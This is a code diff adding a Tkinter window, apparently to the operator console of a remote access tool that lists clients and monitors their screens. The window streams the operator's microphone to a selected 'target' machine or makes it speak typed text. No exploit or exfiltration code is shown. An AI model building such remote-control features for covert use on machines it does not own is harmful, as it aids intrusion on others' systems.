@@ -2095,4 +2095,134 @@ def request_screen_monitor():
 
     threading.Thread(target=run_stream, daemon=True).start()
 
+
+# ── Remote Voice Broadcast ─────────────────────────────────────────────────────
+
+def open_voice_broadcast():
+    """Create or lift the Remote Voice Broadcast window."""
+    if not g.active_client_id:
+        messagebox.showerror("No Client", "Please select a client first!")
+        return
+
+    if g.voice_broadcast_window and g.voice_broadcast_window.winfo_exists():
+        g.voice_broadcast_window.lift()
+        g.voice_broadcast_window.focus_force()
+        return
+
+    win = tk.Toplevel(g.root)
+    win.title("📢 Remote Voice Broadcast")
+    win.geometry("550x480")
+    win.configure(bg="#1A1A22")
+    win.resizable(False, False)
+    win.transient(g.root)
+    win.grab_set()
+    g.voice_broadcast_window = win
+
+    # Get client info
+    with g.clients_lock:
+        client_data = g.clients.get(g.active_client_id, {})
+        info = client_data.get("info", {})
+        hostname = info.get("hostname", "Unknown")
+        client_os = info.get("os", "Unknown")
+
+    # Title label
+    tk.Label(win, text="📢 REMOTE VOICE BROADCAST", font=("Segoe UI", 14, "bold"), bg="#1A1A22", fg="#FF6B6B").pack(pady=(20, 5))
+    tk.Label(win, text=f"Target: {hostname} ({client_os})", font=("Segoe UI", 10), bg="#1A1A22", fg="#B0BEC5").pack(pady=(0, 15))
+
+    # ── Section 1: Microphone Broadcast ──
+    mic_frame = tk.LabelFrame(win, text="🎤 LIVE MICROPHONE BROADCAST", font=("Segoe UI", 10, "bold"), bg="#1A1A22", fg="#FF6B6B", padx=20, pady=15, bd=1, relief="solid")
+    mic_frame.pack(fill="x", padx=30, pady=10)
+
+    status_lbl = tk.Label(mic_frame, text="🔴 STATUS: INACTIVE", font=("Segoe UI", 10, "bold"), bg="#1A1A22", fg="#E0E0E0")
+    status_lbl.pack(anchor="w", pady=(0, 10))
+
+    import gui_commands as cmds
+
+    def toggle_mic_broadcast():
+        if not g.voice_broadcast_active:
+            # Start stream
+            g.voice_broadcast_active = True
+            mic_btn.config(text="⏹ Stop Broadcast", bg="#D32F2F")
+            status_lbl.config(text="🟢 STATUS: STREAMING MICROPHONE AUDIO...", fg="#00E676")
+            # Disable TTS while streaming
+            tts_entry.config(state="disabled")
+            tts_btn.config(state="disabled")
+            threading.Thread(target=cmds.start_voice_broadcast_stream, daemon=True).start()
+        else:
+            # Stop stream
+            cmds.stop_voice_broadcast_stream()
+
+    mic_btn = tk.Button(mic_frame, text="🎤 Start Mic Broadcast", command=toggle_mic_broadcast, font=("Segoe UI", 11, "bold"), bg="#009688", fg="white", relief="flat", padx=20, pady=10, cursor="hand2")
+    mic_btn.pack(fill="x")
+
+    # ── Section 2: Text-To-Speech ──
+    tts_frame = tk.LabelFrame(win, text="💬 TEXT-TO-SPEECH (TTS)", font=("Segoe UI", 10, "bold"), bg="#1A1A22", fg="#00E5FF", padx=20, pady=15, bd=1, relief="solid")
+    tts_frame.pack(fill="x", padx=30, pady=10)
+
+    tk.Label(tts_frame, text="Type text message for client to speak:", font=("Segoe UI", 9), bg="#1A1A22", fg="#B0BEC5").pack(anchor="w", pady=(0, 5))
+    
+    tts_entry = tk.Entry(tts_frame, font=("Segoe UI", 11), bg="#2D2D38", fg="white", insertbackground="white", relief="flat", bd=1)
+    tts_entry.pack(fill="x", ipady=5, pady=(0, 10))
+    tts_entry.insert(0, "Attention! Administrator is connecting to this system.")
+
+    def trigger_tts():
+        text = tts_entry.get().strip()
+        if not text:
+            messagebox.showerror("Error", "Text cannot be empty!")
+            return
+        cmds.send_tts_speak(text)
+
+    tts_btn = tk.Button(tts_frame, text="📢 Speak Message", command=trigger_tts, font=("Segoe UI", 11, "bold"), bg="#00E5FF", fg="#121214", relief="flat", padx=20, pady=10, cursor="hand2")
+    tts_btn.pack(fill="x")
+
+    # ── Close Button ──
+    close_btn = tk.Button(win, text="Close", command=win.destroy, font=("Segoe UI", 10), bg="#555", fg="white", relief="flat", padx=20, pady=8, cursor="hand2")
+    close_btn.pack(pady=(15, 10))
+
+    # Helper UI methods
+    def on_stream_stopped():
+        status_lbl.config(text="🔴 STATUS: INACTIVE", fg="#E0E0E0")
+        mic_btn.config(text="🎤 Start Mic Broadcast", bg="#009688")
+        tts_entry.config(state="normal")
+        tts_btn.config(state="normal")
+
+    win.on_stream_stopped = on_stream_stopped
+
+    # Clean shutdown on close
+    def on_close():
+        if g.voice_broadcast_active:
+            cmds.stop_voice_broadcast_stream()
+        g.voice_broadcast_window = None
+        win.destroy()
+
+    win.protocol("WM_DELETE_WINDOW", on_close)
+
+    # Hover animations (Micro-animations)
+    def on_mic_enter(e): 
+        if g.voice_broadcast_active:
+            mic_btn.config(bg="#B71C1C")
+        else:
+            mic_btn.config(bg="#00796B")
+    def on_mic_leave(e): 
+        if g.voice_broadcast_active:
+            mic_btn.config(bg="#D32F2F")
+        else:
+            mic_btn.config(bg="#009688")
+    mic_btn.bind("<Enter>", on_mic_enter)
+    mic_btn.bind("<Leave>", on_mic_leave)
+
+    def on_tts_enter(e): tts_btn.config(bg="#00B0FF")
+    def on_tts_leave(e): tts_btn.config(bg="#00E5FF")
+    tts_btn.bind("<Enter>", on_tts_enter)
+    tts_btn.bind("<Leave>", on_tts_leave)
+
+    def on_close_enter(e): close_btn.config(bg="#666")
+    def on_close_leave(e): close_btn.config(bg="#555")
+    close_btn.bind("<Enter>", on_close_enter)
+    close_btn.bind("<Leave>", on_close_leave)
+
+    # Focus text entry
+    tts_entry.focus()
+
+
     # on_close and win.protocol are already set above (before stop_btn)
